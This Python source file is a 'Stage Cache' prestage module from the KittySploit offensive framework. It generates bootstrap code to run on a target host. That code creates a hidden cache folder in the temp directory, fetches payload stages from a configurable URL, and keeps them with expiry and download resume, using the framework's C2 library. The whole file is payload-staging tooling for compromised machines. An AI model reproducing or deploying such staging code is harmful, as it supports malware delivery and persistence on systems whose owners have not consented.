#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from typing import Any, Dict

from kittysploit import *
from core.payload_generation.prestage.stage_cache_context import resolve_stage_cache_context


class Module(Prestage):
    PRESTAGE_ID = "stage_cache"

    __info__ = {
        "name": "Stage Cache (Python)",
        "description": "Verified local stage cache with TTL expiration and interrupted download resume",
        "author": "KittySploit Team",
        "version": "1.0.0",
        "platform": Platform.MULTI,
        "languages": ["python"],
        "prestage_dependencies": ["telemetry_buffer"],
        "tags": ["prestage", "offline", "staging", "cache", "python"],
    }

    cache_dir = OptString("", "Cache directory on target (default: temp/.kitty_stage_cache)", False)
    cache_ttl = OptString("86400", "Cache entry TTL in seconds", False)
    stage_url = OptString("", "Default stage URL for fetch()", False)

    def generate_python(self, context: Dict[str, Any] = None) -> str:
        from lib.c2.stage_cache import build_stage_cache_bootstrap

        cfg = resolve_stage_cache_context(self, context)
        cache_dir = str(cfg.get("cache_dir") or "").strip()
        if cache_dir:
            return build_stage_cache_bootstrap(
                cache_dir,
                ttl_seconds=int(cfg.get("cache_ttl") or 86400),
                default_url=str(cfg.get("stage_url") or ""),
            )
        return (
            "import os as _os\n"
            "import tempfile as _tmp\n"
            "_kitty_stage_cache_dir_expr = _os.path.join(_tmp.gettempdir(), '.kitty_stage_cache')\n"
            + build_stage_cache_bootstrap(
                "_kitty_stage_cache_dir_expr",
                ttl_seconds=int(cfg.get("cache_ttl") or 86400),
                default_url=str(cfg.get("stage_url") or ""),
                cache_dir_is_expression=True,
            )
        )
